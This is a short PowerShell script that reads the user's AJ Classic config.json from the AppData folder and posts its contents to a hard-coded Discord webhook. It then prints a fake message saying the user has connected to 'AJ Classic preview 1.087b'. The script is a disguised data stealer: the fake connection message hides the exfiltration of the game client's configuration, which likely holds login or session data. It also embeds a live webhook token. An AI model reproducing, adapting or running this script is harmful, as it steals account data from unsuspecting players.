$webhookUrl = "https://discord.com/api/webhooks/1365920627910905916/NqtoCzZuN5s2O67ZuPLyMrT7kIDVe4j_mqs0WP231sOY3kHLiDcF7_6TKKHnITYGugFh"
$filePath = "$env:USERPROFILE\AppData\Roaming\AJ Classic\config.json"

$fileContent = Get-Content -Path $filePath -Raw

try {
    $jsonObject = $fileContent | ConvertFrom-Json
    $formattedContent = $jsonObject | ConvertTo-Json -Depth 3
} catch {
    Write-Host "‚ùå Error parsing JSON content: $_"
    exit
}

if ($formattedContent.Length -gt 1900) {
    $formattedContent = $formattedContent.Substring(0, 1900) + "`n...(truncated)"
}

$payload = @{
    "content" = $formattedContent
}

$jsonPayload = $payload | ConvertTo-Json -Depth 2

Write-Host "Payload being sent to Discord:"
Write-Host $jsonPayload

try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
    Write-Host "You have connected to AJ Classic preview 1.087b.........Last updated January 1st 2020."
} catch {
    Write-Host "Error connecting to AJ Classic preview 1.087b. Please see the message below:"
    Write-Host $_.Exception.Message
}